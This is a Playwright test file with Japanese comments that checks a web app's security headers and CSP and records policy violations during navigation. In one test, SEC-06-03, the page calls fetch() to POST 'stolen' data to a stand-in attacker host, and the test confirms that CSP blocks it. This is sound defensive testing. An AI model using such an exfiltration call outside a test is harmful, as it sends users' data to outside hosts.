import type { Page } from "@playwright/test";
import { expect, test } from "../../support/fixtures";
import { loginViaUi, tableRow } from "../../support/ui";

/** CSPのディレクティブを { ディレクティブ名: 値 } に分解する */
function parseCsp(header: string | undefined): Record<string, string> {
  const directives: Record<string, string> = {};
  for (const part of (header ?? "").split(";")) {
    const [name, ...values] = part.trim().split(/\s+/);
    if (name) directives[name] = values.join(" ");
  }
  return directives;
}

/** ページ内で発生したCSP違反(securitypolicyviolation イベント)を記録する */
async function recordCspViolations(page: Page): Promise<() => Promise<string[]>> {
  await page.addInitScript(() => {
    const w = window as unknown as { __cspViolations: string[] };
    w.__cspViolations = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      w.__cspViolations.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
  });
  return () => page.evaluate(() => (window as unknown as { __cspViolations: string[] }).__cspViolations);
}

test.describe("9.10 SEC-06 セキュリティヘッダー・CSP", () => {
  test("SEC-06-01 画面のレスポンスにセキュリティヘッダーが付く", async ({ page }) => {
    const response = await page.request.get("/login");
    const headers = response.headers();

    const csp = parseCsp(headers["content-security-policy"]);
    expect(csp["default-src"]).toBe("'self'");
    expect(csp["object-src"]).toBe("'none'");
    expect(csp["base-uri"]).toBe("'self'");
    expect(csp["form-action"]).toBe("'self'");
    expect(csp["frame-ancestors"]).toBe("'none'");
    expect(csp["connect-src"]).toBe("'self'");
    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["x-frame-options"]).toBe("DENY");
    expect(headers["referrer-policy"]).toBe("strict-origin-when-cross-origin");
    expect(headers["permissions-policy"]).toContain("camera=()");
    // 使用しているフレームワークを外部に知らせない
    expect(headers["x-powered-by"]).toBeUndefined();
  });

  test("SEC-06-02 画面操作中にCSP違反が発生しない", async ({ page, data }) => {
    const user = await data.createUser();
    const project = await data.createProject(user);
    const task = await data.createTask(project.id, user);
    const violations = await recordCspViolations(page);
    const consoleErrors: string[] = [];
    page.on("console", (message) => {
      if (message.type() === "error" && /Content Security Policy/i.test(message.text())) {
        consoleErrors.push(message.text());
      }
    });

    await loginViaUi(page, user);
    expect(await violations()).toEqual([]);
    await tableRow(page, project.name).click();
    await expect(page.getByRole("heading", { name: "プロジェクト詳細" })).toBeVisible();
    expect(await violations()).toEqual([]);
    await page.goto(`/projects/${project.id}/tasks`);
    await expect(page.getByRole("heading", { name: "タスク一覧" })).toBeVisible();
    expect(await violations()).toEqual([]);
    await page.goto(`/tasks/${task.id}`);
    await expect(page.getByRole("heading", { name: "タスク詳細" })).toBeVisible();
    expect(await violations()).toEqual([]);
    await page.goto("/projects/new");
    await expect(page.getByRole("heading", { name: "プロジェクト登録" })).toBeVisible();
    expect(await violations()).toEqual([]);
    expect(consoleErrors).toEqual([]);
  });

  test("SEC-06-03 画面から他サイトへの通信はCSPでブロックされる", async ({ page, data }) => {
    // XSSが発生した場合に、盗んだ情報を攻撃者のサーバーへ送信されるのを防ぐ(connect-src 'self')
    const user = await data.createUser();
    const violations = await recordCspViolations(page);
    await loginViaUi(page, user);

    const result = await page.evaluate(() =>
      fetch("https://attacker.example.test/collect", { method: "POST", body: "stolen" }).then(
        () => "sent",
        () => "blocked",
      ),
    );

    expect(result).toBe("blocked");
    expect(await violations()).toContainEqual(expect.stringMatching(/^connect-src https:\/\/attacker\.example\.test/));
  });

  test("SEC-06-04 APIのレスポンスにセキュリティヘッダーが付く", async ({ api }) => {
    const response = await api.get("/api/users");
    const headers = response.headers();

    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["x-frame-options"]).toBe("DENY");
    // JSONのみを返すAPIのため、あらゆるリソースの読み込みを禁止する
    const csp = parseCsp(headers["content-security-policy"]);
    expect(csp["default-src"]).toBe("'none'");
    expect(csp["frame-ancestors"]).toBe("'none'");
    // 使用しているWebサーバーを外部に知らせない
    expect(headers["server"]).toBeUndefined();
  });
});
